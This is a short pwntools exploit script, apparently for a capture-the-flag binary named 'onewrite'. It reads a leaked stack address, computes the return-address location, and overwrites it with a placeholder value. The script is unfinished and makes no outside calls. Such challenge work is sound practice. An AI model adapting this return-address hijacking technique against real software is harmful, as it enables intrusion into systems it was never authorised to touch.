#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template onewrite
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('onewrite')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript, *a, **kw)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b do_overwrite
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(b" > ")
pause()
io.sendline(b"1")

stack_leak = int(io.recvline().strip(), 0)
log.info(f"Got stack leak: {hex(stack_leak)}")
stack_beg = stack_leak - 0x1fad0
log.info(f"Stack begins at {hex(stack_beg)}")
return_address = stack_leak + 0x18
log.info(f"Return address is at {hex(return_address)}")

address = str(return_address).encode()
log.info(f"Sending address: {address}")
io.recvuntil(b"address : ")
io.sendline(address)
data = p64(0xdeadbeef)
log.info(f"Setting data under address to: {data}")
io.recvuntil(b"data : ")
io.send(data)

# io.interactive()

